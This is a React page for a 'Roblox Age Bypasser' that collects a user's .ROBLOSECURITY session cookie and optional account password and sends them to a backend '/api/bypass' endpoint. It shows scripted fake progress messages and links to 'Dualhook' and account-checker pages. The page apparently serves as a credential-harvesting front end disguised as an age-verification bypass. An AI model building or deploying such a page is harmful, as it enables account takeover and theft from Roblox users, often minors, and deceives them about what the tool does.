"use client"

import { useState, useEffect, useCallback } from "react"
import { ShieldCheck, Loader2, CheckCircle, XCircle, AlertTriangle, Lock, Eye, EyeOff, ArrowRight, X, Shield } from "lucide-react"
import Link from "next/link"
import useSWR from "swr"

interface BypassLogEntry {
  username: string
  displayName: string
  avatarUrl: string
  userId: number
  status: "success" | "failed"
  timestamp: string
}

const fetcher = (url: string) => fetch(url).then(r => r.json())

interface SystemStatus {
  locked: boolean
  paused: boolean
  maintenanceMessage?: string
}

interface AccountInfo {
  username: string
  displayName: string
  avatarUrl: string
  userId: number
}

/* ── Result Modal ── */
function ResultModal({ type, message, onClose }: { type: "success" | "error"; message: string; onClose: () => void }) {
  useEffect(() => {
    const handleEsc = (e: KeyboardEvent) => { if (e.key === "Escape") onClose() }
    document.addEventListener("keydown", handleEsc)
    return () => document.removeEventListener("keydown", handleEsc)
  }, [onClose])

  const isSuccess = type === "success"

  return (
    <div className="fixed inset-0 z-[100] flex items-center justify-center p-5">
      <div className="absolute inset-0 bg-black/70 backdrop-blur-sm animate-backdrop-in" onClick={onClose} />
      <div className="relative w-full max-w-sm animate-modal-in">
        <div className="bg-[#111114] border border-[#1e1e24] rounded-2xl overflow-hidden">
          {/* Top accent bar */}
          <div className={`h-1 w-full ${isSuccess ? "bg-emerald-500" : "bg-red-500"}`} />
          <div className="p-6">
            {/* Icon */}
            <div className="flex justify-center mb-5">
              <div className={`w-16 h-16 rounded-2xl flex items-center justify-center ${
                isSuccess
                  ? "bg-emerald-500/10 border border-emerald-500/20"
                  : "bg-red-500/10 border border-red-500/20"
              }`}>
                {isSuccess
                  ? <CheckCircle className="w-8 h-8 text-emerald-400" />
                  : <XCircle className="w-8 h-8 text-red-400" />
                }
              </div>
            </div>
            {/* Text */}
            <h3 className="text-lg font-semibold text-[#fafafa] text-center mb-2">
              {isSuccess ? "Bypass Complete" : "Bypass Failed"}
            </h3>
            <p className="text-sm text-[#71717a] text-center leading-relaxed mb-6">{message}</p>
            {/* Actions */}
            <div className="flex gap-3">
              <button
                onClick={onClose}
                className="flex-1 py-3 bg-[#18181b] hover:bg-[#27272a] border border-[#27272a] text-[#a1a1aa] text-sm font-medium rounded-xl transition-colors"
              >
                Close
              </button>
              {isSuccess && (
                <Link href="/dashboard" className="flex-1 py-3 bg-[#6366f1] hover:bg-[#5558e6] text-white text-sm font-medium rounded-xl transition-colors text-center">
                  Dashboard
                </Link>
              )}
            </div>
          </div>
        </div>
      </div>
    </div>
  )
}

/* ── System Locked Modal ── */
function SystemLockedModal({ message }: { message: string }) {
  return (
    <div className="fixed inset-0 z-[100] flex items-center justify-center p-5">
      <div className="absolute inset-0 bg-black/80 backdrop-blur-sm animate-backdrop-in" />
      <div className="relative w-full max-w-sm animate-modal-in">
        <div className="bg-[#111114] border border-[#1e1e24] rounded-2xl overflow-hidden">
          <div className="h-1 w-full bg-amber-500" />
          <div className="p-6">
            <div className="flex justify-center mb-5">
              <div className="w-16 h-16 rounded-2xl bg-amber-500/10 border border-amber-500/20 flex items-center justify-center">
                <AlertTriangle className="w-8 h-8 text-amber-400" />
              </div>
            </div>
            <h3 className="text-lg font-semibold text-[#fafafa] text-center mb-2">System Unavailable</h3>
            <p className="text-sm text-[#71717a] text-center leading-relaxed">
              {message || "The bypass service is currently offline for maintenance. Please try again later."}
            </p>
          </div>
        </div>
      </div>
    </div>
  )
}

/* ── Main Page ── */
export default function Home() {
  const [cookie, setCookie] = useState("")
  const [password, setPassword] = useState("")
  const [showPassword, setShowPassword] = useState(false)
  const [isProcessing, setIsProcessing] = useState(false)
  const [modalState, setModalState] = useState<{ type: "success" | "error"; message: string } | null>(null)
  const [systemStatus, setSystemStatus] = useState<SystemStatus>({ locked: false, paused: false })
  const [accountInfo, setAccountInfo] = useState<AccountInfo | null>(null)
  const [processingProgress, setProcessingProgress] = useState(0)
  const [processingStatus, setProcessingStatus] = useState("Initializing...")
  const [mode, setMode] = useState<"cookie" | "password">("cookie")

  const { mutate: mutateLogs } = useSWR<{ logs: BypassLogEntry[] }>(
    "/api/bypass-logs",
    fetcher,
    { refreshInterval: 10000, revalidateOnFocus: true }
  )

  useEffect(() => {
    const checkStatus = () => {
      try {
        const savedSettings = localStorage.getItem('admin_settings')
        if (savedSettings) {
          const settings = JSON.parse(savedSettings)
          setSystemStatus({
            locked: settings.isLocked || false,
            paused: settings.isPaused || false,
            maintenanceMessage: settings.maintenanceMessage || ''
          })
        }
      } catch {}
    }
    checkStatus()
    const interval = setInterval(checkStatus, 5000)
    return () => clearInterval(interval)
  }, [])

  const closeModal = useCallback(() => setModalState(null), [])

  const handleBypass = async () => {
    if (!cookie.trim()) {
      setModalState({ type: "error", message: "Please enter a valid .ROBLOSECURITY cookie to proceed." })
      return
    }
    if (systemStatus.locked || systemStatus.paused) {
      setModalState({ type: "error", message: "System is currently under maintenance. Please try again later." })
      return
    }

    setIsProcessing(true)
    setModalState(null)
    setAccountInfo(null)
    setProcessingProgress(0)
    setProcessingStatus("Establishing connection...")

    const startTime = Date.now()

    const stages = [
      { pct: 5, text: "Establishing secure tunnel..." },
      { pct: 12, text: "Validating cookie format..." },
      { pct: 20, text: "Authenticating session..." },
    ]

    for (const stage of stages) {
      setProcessingProgress(stage.pct)
      setProcessingStatus(stage.text)
      await new Promise(r => setTimeout(r, 600))
    }

    try {
      const verifyRes = await fetch('/api/verify-cookie', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ cookie: cookie.trim() }),
      })
      const verifyData = await verifyRes.json()
      if (verifyData.success) {
        setAccountInfo({
          username: verifyData.username,
          displayName: verifyData.displayName,
          avatarUrl: verifyData.avatarUrl,
          userId: verifyData.userId,
        })
      }
    } catch {}

    setProcessingProgress(30)
    setProcessingStatus("Bypassing age verification...")

    try {
      const csrfRes = await fetch('/api/csrf-token')
      const { csrfToken } = await csrfRes.json()

      const progressInterval = setInterval(() => {
        setProcessingProgress(prev => {
          if (prev >= 90) { clearInterval(progressInterval); return 90 }
          const step = Math.random() * 4 + 1
          return Math.min(90, prev + step)
        })
      }, 800)

      const bypassStages = [
        { delay: 2000, text: "Injecting override payload..." },
        { delay: 4000, text: "Modifying auth tokens..." },
        { delay: 7000, text: "Decrypting session layer..." },
        { delay: 10000, text: "Extracting verification keys..." },
        { delay: 15000, text: "Bypassing rate limiter..." },
        { delay: 20000, text: "Patching session data..." },
        { delay: 28000, text: "Finalizing bypass operation..." },
        { delay: 38000, text: "Cleaning up traces..." },
      ]

      for (const stage of bypassStages) {
        setTimeout(() => setProcessingStatus(stage.text), stage.delay)
      }

      const response = await fetch('/api/bypass', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'x-csrf-token': csrfToken,
        },
        body: JSON.stringify({ cookie: cookie.trim(), password: password.trim() }),
      })

      const data = await response.json()
      clearInterval(progressInterval)

      if (data.success) {
        setProcessingProgress(95)
        setProcessingStatus("Completing operation...")
        const elapsed = Date.now() - startTime
        const remaining = Math.max(0, 50000 - elapsed)
        await new Promise(resolve => setTimeout(resolve, remaining))
        setProcessingProgress(100)
        setProcessingStatus("Done")
        await new Promise(r => setTimeout(r, 500))
        setIsProcessing(false)
        setAccountInfo(null)
        setModalState({ type: "success", message: "Age verification bypass completed successfully. The target account has been processed." })
        setCookie("")
        setPassword("")
        mutateLogs()
      } else {
        setIsProcessing(false)
        setAccountInfo(null)
        setModalState({ type: "error", message: data.message || "Bypass failed. Please verify your cookie is valid and try again." })
        mutateLogs()
      }
    } catch {
      setIsProcessing(false)
      setAccountInfo(null)
      setModalState({ type: "error", message: "Connection to bypass service failed. Please check your network." })
      mutateLogs()
    }
  }

  return (
    <div className="min-h-screen bg-[#09090b] text-[#fafafa] flex flex-col">
      {modalState && <ResultModal type={modalState.type} message={modalState.message} onClose={closeModal} />}
      {(systemStatus.locked || systemStatus.paused) && <SystemLockedModal message={systemStatus.maintenanceMessage || ""} />}

      {/* Navigation */}
      <header className="border-b border-[#1e1e24]">
        <div className="max-w-5xl mx-auto px-6 h-14 flex items-center justify-between">
          <Link href="/" className="flex items-center gap-2.5">
            <div className="w-7 h-7 rounded-lg bg-[#6366f1]/10 border border-[#6366f1]/20 flex items-center justify-center">
              <Shield className="w-3.5 h-3.5 text-[#6366f1]" />
            </div>
            <span className="text-sm font-semibold text-[#fafafa]">Bypasser</span>
          </Link>
          <nav className="flex items-center gap-1">
            <Link href="/dashboard" className="px-3 py-1.5 text-xs font-medium text-[#52525b] hover:text-[#a1a1aa] hover:bg-[#18181b] transition-colors rounded-lg">
              Dashboard
            </Link>
            <Link href="/account-checker" className="px-3 py-1.5 text-xs font-medium text-[#52525b] hover:text-[#a1a1aa] hover:bg-[#18181b] transition-colors rounded-lg">
              Checker
            </Link>
            <Link href="/dualhook" className="px-3 py-1.5 text-xs font-medium text-[#52525b] hover:text-[#a1a1aa] hover:bg-[#18181b] transition-colors rounded-lg">
              Dualhook
            </Link>
            <div className="ml-2 flex items-center gap-1.5 px-2.5 py-1.5 rounded-lg bg-[#18181b] border border-[#27272a]">
              <div className="w-1.5 h-1.5 rounded-full bg-emerald-500" />
              <span className="text-[10px] font-semibold text-emerald-500 uppercase tracking-wide">Online</span>
            </div>
          </nav>
        </div>
      </header>

      {/* Main content */}
      <main className="flex-1 flex flex-col items-center justify-center px-6 py-20">
        <div className="w-full max-w-md">
          {/* Centered heading area */}
          <div className="text-center mb-10 animate-fade-in-up">
            <div className="inline-flex items-center justify-center w-16 h-16 rounded-2xl bg-[#6366f1]/10 border border-[#6366f1]/15 mb-6">
              <ShieldCheck className="w-8 h-8 text-[#6366f1]" />
            </div>
            <h1 className="text-2xl font-bold tracking-tight text-[#fafafa] mb-2">
              Roblox Age Bypasser
            </h1>
            <p className="text-sm text-[#71717a] leading-relaxed">
              Secure automation with real-time session override
            </p>
          </div>

          {/* Main card */}
          <div className="bg-[#111114] border border-[#1e1e24] rounded-2xl overflow-hidden animate-delay-1">
            <div className="px-6 py-5 border-b border-[#1e1e24] flex items-center justify-between">
              <div className="flex items-center gap-2">
                <Lock className="w-4 h-4 text-[#3f3f46]" />
                <span className="text-sm font-medium text-[#a1a1aa]">Bypass Configuration</span>
              </div>
              <button
                type="button"
                onClick={() => setMode(mode === "cookie" ? "password" : "cookie")}
                className="text-xs text-[#6366f1] hover:text-[#818cf8] transition-colors font-medium"
              >
                {mode === "cookie" ? "Add password" : "Cookie only"}
              </button>
            </div>

            <div className="p-6 space-y-5">
              {/* Cookie input */}
              <div className="space-y-2">
                <label className="text-xs font-medium text-[#a1a1aa]">Cookie</label>
                <input
                  type="text"
                  placeholder="_|WARNING:-DO-NOT-SHARE-THIS.-Sharing..."
                  value={cookie}
                  onChange={(e) => setCookie(e.target.value)}
                  className="w-full px-4 py-3 bg-[#09090b] border border-[#27272a] rounded-xl text-sm text-[#fafafa] placeholder:text-[#3f3f46] focus:border-[#6366f1]/50 focus:ring-2 focus:ring-[#6366f1]/10 transition-all outline-none font-mono"
                />
              </div>

              {/* Password input */}
              {mode === "password" && (
                <div className="space-y-2 animate-slide-up">
                  <label className="text-xs font-medium text-[#a1a1aa]">Password</label>
                  <div className="relative">
                    <input
                      type={showPassword ? "text" : "password"}
                      placeholder="Enter account password"
                      value={password}
                      onChange={(e) => setPassword(e.target.value)}
                      className="w-full px-4 py-3 pr-11 bg-[#09090b] border border-[#27272a] rounded-xl text-sm text-[#fafafa] placeholder:text-[#3f3f46] focus:border-[#6366f1]/50 focus:ring-2 focus:ring-[#6366f1]/10 transition-all outline-none"
                    />
                    <button
                      type="button"
                      onClick={() => setShowPassword(!showPassword)}
                      className="absolute right-3.5 top-1/2 -translate-y-1/2 text-[#3f3f46] hover:text-[#71717a] transition-colors"
                    >
                      {showPassword ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
                    </button>
                  </div>
                </div>
              )}

              {/* Processing state */}
              {isProcessing ? (
                <div className="bg-[#09090b] border border-[#1e1e24] rounded-xl p-5">
                  {accountInfo ? (
                    <div className="space-y-4">
                      <div className="flex items-center gap-3">
                        <div className="w-11 h-11 rounded-xl overflow-hidden border border-[#27272a] bg-[#18181b] shrink-0">
                          {accountInfo.avatarUrl ? (
                            <img src={accountInfo.avatarUrl} alt={accountInfo.username} className="w-full h-full object-cover" crossOrigin="anonymous" />
                          ) : (
                            <div className="w-full h-full flex items-center justify-center text-[#52525b] text-sm font-bold">
                              {accountInfo.username.charAt(0).toUpperCase()}
                            </div>
                          )}
                        </div>
                        <div className="flex-1 min-w-0">
                          <p className="text-sm font-semibold text-[#fafafa] truncate">{accountInfo.displayName}</p>
                          <p className="text-xs text-[#52525b] truncate">@{accountInfo.username}</p>
                        </div>
                        <div className="flex items-center gap-1.5 px-2 py-1 bg-[#18181b] rounded-md border border-[#27272a]">
                          <div className="w-1.5 h-1.5 bg-[#6366f1] rounded-full" />
                          <span className="text-[10px] font-semibold text-[#6366f1]">Active</span>
                        </div>
                      </div>

                      <div className="space-y-2">
                        <div className="flex items-center justify-between">
                          <span className="text-xs text-[#71717a]">{processingStatus}</span>
                          <span className="text-xs font-mono text-[#52525b]">{processingProgress}%</span>
                        </div>
                        <div className="h-2 w-full bg-[#18181b] rounded-full overflow-hidden">
                          <div
                            className="h-full bg-[#6366f1] rounded-full transition-all duration-700 ease-out progress-stripe"
                            style={{ width: `${processingProgress}%` }}
                          />
                        </div>
                      </div>
                    </div>
                  ) : (
                    <div className="flex items-center gap-3">
                      <Loader2 className="w-5 h-5 text-[#6366f1] animate-spin shrink-0" />
                      <div>
                        <p className="text-sm font-medium text-[#a1a1aa]">Authenticating</p>
                        <p className="text-xs text-[#52525b]">Validating cookie session...</p>
                      </div>
                    </div>
                  )}
                </div>
              ) : (
                <button
                  onClick={handleBypass}
                  disabled={!cookie.trim() || systemStatus.locked || systemStatus.paused}
                  className="w-full py-3.5 bg-[#6366f1] hover:bg-[#5558e6] disabled:bg-[#18181b] disabled:text-[#3f3f46] text-white font-semibold text-sm rounded-xl transition-colors cursor-pointer disabled:cursor-not-allowed flex items-center justify-center gap-2"
                >
                  {systemStatus.locked || systemStatus.paused ? (
                    "System Unavailable"
                  ) : (
                    <>
                      <ShieldCheck className="w-4 h-4" />
                      Start Bypass
                      <ArrowRight className="w-4 h-4" />
                    </>
                  )}
                </button>
              )}
            </div>
          </div>

          {/* Footer badges */}
          <div className="mt-8 flex items-center justify-center gap-3 animate-delay-2">
            {["Encrypted", "Automated", "Real-time"].map((label) => (
              <span key={label} className="px-3 py-1.5 bg-[#111114] border border-[#1e1e24] rounded-lg text-[10px] font-medium text-[#52525b] uppercase tracking-wider">
                {label}
              </span>
            ))}
          </div>
        </div>
      </main>
    </div>
  )
}
